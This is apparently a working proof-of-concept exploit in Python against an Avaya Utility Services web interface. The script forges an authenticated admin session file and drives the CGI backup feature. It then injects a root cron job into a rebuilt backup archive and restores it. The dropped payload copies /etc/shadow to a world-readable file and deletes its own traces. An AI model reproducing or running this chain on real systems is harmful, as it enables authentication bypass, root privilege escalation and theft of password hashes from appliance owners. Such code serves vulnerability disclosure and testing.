#!/usr/bin/python

import os
import subprocess
import time
import random
import string
import pwd
import grp
import sys
import re

CGI_BIN = "/opt/avaya/smi/cgi-bin/cgi_main"
SESSION_PATH = "/var/lib/php/session"
IP = "127.0.0.1"
USER = "admin"


def create_random_string(alphabet, length):
    """Utility method to create random strings that works across python versions"""

    return "".join(
        alphabet[random.randint(0, len(alphabet) - 1)] for _ in range(length)
    )


def get_request(path, sessionid, ip):
    """Makes CGI GET requests"""
    os.environ["GATEWAY_INTERFACE"] = "CGI/1.1"
    os.environ["REQUEST_METHOD"] = "GET"
    os.environ[
        "HTTP_USER_AGENT"
    ] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
    os.environ["QUERY_STRING"] = ""
    os.environ["REMOTE_ADDR"] = ip
    os.environ["HTTP_COOKIE"] = "sessionId=" + sessionid
    os.environ["SCRIPT_NAME"] = "/cgi-bin/" + path
    os.environ["REDIRECT_STATUS"] = "1"
    os.environ["REQUEST_URI"] = "/cgi-bin/" + path

    r = subprocess.Popen(
        [CGI_BIN, path], stdout=subprocess.PIPE, stderr=subprocess.STDOUT
    )
    return r.stdout.read()


def create_session_token(ip, user):
    """Creates a forged, authenticated session"""

    template = """logPageName|s:12:"legal notice";loginMethod|i:1;userName|s:5:"admin";expireTime|i:%d;authenticated|s:3:"yes";pam_session0|s:0:"";userId|i:%d;userGroup|s:%d:"%s";groupId|i:%d;ProfileId|s:2:"18";MENU_ID_loginUtils|s:3:"1.0";MENU_ID_topNavMenu|s:3:"3.0";MENU_ID_ESD_LeftNavigationMenu|s:3:"2.0";MENU_ID_UtilLeftNavigationMenu|s:3:"3.0";client_ip|s:%d:"%s";creationTime|i:%d;"""

    # Get user UID, GID, and Group Name
    u = pwd.getpwnam(user)
    group_name = grp.getgrgid(u.pw_gid).gr_name

    # Generate session token that doesn't collide with existing ones and looks same as real session token (not technically necessary)
    alphanumeric = string.ascii_lowercase + string.digits

    while True:
        session = create_random_string(alphanumeric, 26)

        if not os.path.exists(os.path.join(SESSION_PATH, "sess_" + session)):
            break

    createTime = int(time.time())
    expireTime = createTime + 100000

    session_token = template % (
        expireTime,
        u.pw_uid,
        len(group_name),
        group_name,
        u.pw_gid,
        len(ip),
        ip,
        createTime,
    )

    with open(os.path.join(SESSION_PATH, "sess_" + session), "w") as f:
        f.write(session_token)

    return session


def do_get_backup_post(sessionid, ip):
    """Handles backup creation via CGI POST Calls"""

    boundary1 = "-----------------------------" + create_random_string(
        string.digits, 29
    )

    post_data1 = (
        "\r\n".join(
            [
                "{0}",
                'Content-Disposition: form-data; name="disableFirmwareBackup"',
                "",
                "Exclude Firmware in Backup",
                "{0}",
                'Content-Disposition: form-data; name="MAX_FILE_SIZE"',
                "",
                "800000000",
                "{0}",
                'Content-Disposition: form-data; name="uploadFile"; filename=""',
                "Content-Type: application/octet-stream",
                "",
                "",
                "{0}",
                'Content-Disposition: form-data; name="actionStep"',
                "",
                "actionStep",
                "{0}--",
            ]
        )
    ).format(boundary1)

    boundary2 = "-----------------------------" + create_random_string(
        string.digits, 29
    )

    post_data2 = (
        "\r\n".join(
            [
                "{0}",
                'Content-Disposition: form-data; name="MAX_FILE_SIZE"',
                "",
                "800000000",
                "{0}",
                'Content-Disposition: form-data; name="createBackup"',
                "",
                "Create Backup",
                "{0}",
                'Content-Disposition: form-data; name="uploadFile"; filename=""',
                "Content-Type: application/octet-stream",
                "",
                "",
                "{0}",
                'Content-Disposition: form-data; name="actionStep"',
                "",
                "actionStep",
                "{0}--",
            ]
        )
    ).format(boundary2)

    os.environ["GATEWAY_INTERFACE"] = "CGI/1.1"
    os.environ["REQUEST_METHOD"] = "POST"
    os.environ[
        "HTTP_USER_AGENT"
    ] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
    os.environ["REMOTE_ADDR"] = ip
    os.environ["HTTP_COOKIE"] = "sessionId=" + sessionid
    os.environ["SCRIPT_NAME"] = "/cgi-bin/utilserv/confUSBackup/w_confUSBackup"
    os.environ["REDIRECT_STATUS"] = "1"
    os.environ["REQUEST_URI"] = "/cgi-bin/utilserv/confUSBackup/w_confUSBackup"
    os.environ["CONTENT_TYPE"] = "multipart/form-data; boundary=" + boundary1[2:]

    os.environ["CONTENT_LENGTH"] = str(len(post_data1))
    r = subprocess.Popen(
        [CGI_BIN, "utilserv/confUSBackup/w_confUSBackup"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
    )
    r.stdin.write(post_data1)
    r.stdin.close()

    os.environ["CONTENT_TYPE"] = "multipart/form-data; boundary=" + boundary2[2:]
    os.environ["CONTENT_LENGTH"] = str(len(post_data2))
    r = subprocess.Popen(
        [CGI_BIN, "utilserv/confUSBackup/w_confUSBackup"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
    )
    r.stdin.write(post_data2)
    r.stdin.close()

    return re.findall(r"/tmp/(.*?\.tar\.gz)", r.stdout.read())[0]


def create_malicious_backup(backup_path):
    """
    Handles modification of backup, and payload dropping
    
    To prevent the need to pull the tar to a system where we have root so we can preserve all file ownership
    We instead just replace util_backup.tar.gz with an archive containing our malicious cron job as the only file.
    This should work (at least own the two versions we have tested) as the only backup sanity checking seems to 
    consist of ensuring that unexpected files are not uploaded, and that the database backups exist and are valid.

    Both archives must have a root folder of "."
    """

    pre_commands = [
        ["mkdir", "-p", "/tmp/poc/util_backup/etc/cron.d"],
        ["tar", "-xpzf", backup_path, "--force-local", "-C", "/tmp/poc/"],
        ["rm", "-f", "/tmp/poc/util_backup.tar.gz"],
    ]

    post_commands = [
        ["chmod", "644", "/tmp/poc/util_backup/etc/cron.d/poc"],
        [
            "tar",
            "-cpzf",
            "/tmp/poc/util_backup.tar.gz",
            "-C",
            "/tmp/poc/util_backup",
            "--owner=0",
            "--group=0",
            "./",
        ],
        ["rm", "-rf", "/tmp/poc/util_backup"],
        ["tar", "-cpzf", "/tmp/mal_backup.tar.gz", "-C", "/tmp/poc", "./"],
        ["rm", "-rf", "/tmp/poc"],
    ]

    mal_cron = "\n".join(
        ["SHELL=/bin/sh", "HOME=/", 'MAILTO=""', "* * * * * root /tmp/poc", "", ""]
    )

    poc_script = "\n".join(
        [
            "#!/bin/bash",
            "cp /etc/shadow /tmp/shadow",
            "chmod 777 /tmp/shadow",
            "chown apache:apache /tmp/shadow",
            "rm -f /etc/cron.d/poc",
            "rm -f /tmp/poc",
            "rm -f /tmp/Utility_Services_Backup*",
            "rm -f /tmp/mal_backup.tar.gz",
            "rm -f /tmp/stage*",
            "",
            "",
        ]
    )

    try:
        # Attempt to clean-up previous runs
        subprocess.Popen(["rm", "-rf", "/tmp/poc", "/tmp/mal_backup.tar.gz"]).wait()
    except:
        pass

    for cmd in pre_commands:
        subprocess.Popen(cmd).wait()

    with open("/tmp/poc/util_backup/etc/cron.d/poc", "w") as f:
        f.write(mal_cron)

    for cmd in post_commands:
        subprocess.Popen(cmd).wait()

    with open("/tmp/poc", "w") as f:
        f.write(poc_script)

    subprocess.Popen(["chmod", "777", "/tmp/poc"]).wait()


def do_restore_backup_post(sessionid, ip, backup_path):
    """Handles CGI POST to restore malicious backup"""

    boundary = "-----------------------------" + create_random_string(string.digits, 29)

    with open(backup_path, "rb") as f:
        data = f.read()

    post_data = (
        "\r\n".join(
            [
                "{0}",
                'Content-Disposition: form-data; name="MAX_FILE_SIZE"',
                "",
                "800000000",
                "{0}",
                'Content-Disposition: form-data; name="uploadFile"; filename="backup.tar.gz"',
                "Content-Type: application/gzip",
                "",
                "{1}",
                "{0}",
                'Content-Disposition: form-data; name="uploadBackup"',
                "",
                "Upload Backup",
                "{0}",
                'Content-Disposition: form-data; name="actionStep"',
                "",
                "actionStep",
                "{0}--",
            ]
        )
    ).format(boundary, data)

    os.environ["GATEWAY_INTERFACE"] = "CGI/1.1"
    os.environ["REQUEST_METHOD"] = "POST"
    os.environ[
        "HTTP_USER_AGENT"
    ] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
    os.environ["REMOTE_ADDR"] = ip
    os.environ["HTTP_COOKIE"] = "sessionId=" + sessionid + "; menuPos=51"
    os.environ["SCRIPT_NAME"] = "/cgi-bin/utilserv/confUSBackup/w_confUSBackup"
    os.environ["REDIRECT_STATUS"] = "1"
    os.environ["REQUEST_URI"] = "/cgi-bin/utilserv/confUSBackup/w_confUSBackup"
    os.environ["CONTENT_TYPE"] = "multipart/form-data; boundary=" + boundary[2:]
    os.environ["CONTENT_LENGTH"] = str(len(post_data))

    r = subprocess.Popen(
        [CGI_BIN, "utilserv/confUSBackup/w_confUSBackup"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
    )
    r.stdin.write(post_data)
    r.stdin.close()

    return r.stdout.read()


with open("/tmp/results.txt", "w", 0) as f:

    f.write("Stage 1: Forging Session Token...\n")
    sessionid = create_session_token(IP, USER)

    f.write("Stage 2: Activating forged token: " + sessionid + "...\n")
    get_request("common/legal/w_legal", sessionid, IP)

    f.write("Stage 3: Creating a backup (can be very slow)...\n")
    backup = do_get_backup_post(sessionid, IP)

    if not backup:
        f.write("Error: Backup not created for some reason.\n")
        exit(-1)

    f.write(
        "Stage 4: Altering backup with malicious cron job and dropping payload...\n"
    )
    create_malicious_backup("/tmp/" + backup)

    f.write("Stage 5: Restoring malicous backup...\n")
    do_restore_backup_post(sessionid, IP, "/tmp/mal_backup.tar.gz")

    f.write("Done.  Please wait approximately one minute for /tmp/shadow to appear.\n")
